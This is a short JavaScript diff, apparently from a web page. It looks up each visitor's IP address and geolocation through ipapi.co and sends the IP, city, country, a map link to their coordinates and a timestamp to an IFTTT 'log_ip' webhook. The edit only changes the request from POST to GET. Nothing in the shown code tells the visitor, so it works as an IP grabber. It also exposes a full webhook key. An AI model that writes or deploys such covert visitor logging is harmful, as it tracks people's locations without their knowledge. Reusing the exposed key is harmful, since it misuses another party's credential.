@@ -12,27 +12,20 @@
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
 
-        const ip = data.ip || "No IP";
-        const city = data.city || "No city";
-        const region = data.region || "No region";
-        const country = data.country_name || "No country";
+        const ip = data.ip || "Unknown IP";
+        const city = data.city || "Unknown City";
+        const region = data.region || "Unknown Region";
+        const country = data.country_name || "Unknown Country";
         const lat = data.latitude || "0";
         const lon = data.longitude || "0";
         const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
         const timestamp = new Date().toLocaleString();
         const location = `${ip} — ${city}, ${region}, ${country}`;
 
-        await fetch("https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            value1: location,
-            value2: mapsLink,
-            value3: timestamp
-          })
-        });
+        // Use GET with query parameters instead of POST JSON
+        const iftttURL = `https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG?value1=${encodeURIComponent(location)}&value2=${encodeURIComponent(mapsLink)}&value3=${encodeURIComponent(timestamp)}`;
+        
+        await fetch(iftttURL);
 
       } catch (err) {
         console.error("Logging failed:", err);
